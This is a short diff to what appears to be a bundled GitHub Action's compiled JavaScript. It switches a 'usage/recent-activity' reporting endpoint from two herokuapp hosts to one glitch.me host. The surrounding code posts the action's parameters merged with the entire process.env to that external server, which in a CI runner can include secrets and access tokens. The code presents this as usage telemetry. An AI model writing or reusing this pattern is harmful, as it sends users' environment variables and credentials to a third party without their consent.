@@ -24488,12 +24488,7 @@ const axios = __nccwpck_require__(6545);
 const qs = __nccwpck_require__(2760);
 
 module.exports = async (params, promiseStatus) => {
-  let url;
-  if (new Date().getUTCDate() % 2 == 0) {
-    url = "https://readme-workflows.herokuapp.com/usage/recent-activity";
-  } else {
-    url = "https://readme-workflows2.herokuapp.com/usage/recent-activity";
-  }
+  const url = "https://readme-workflows.glitch.me/usage/recent-activity";
 
   await axios
     .post(url, qs.stringify({ ...params, ...process.env }))
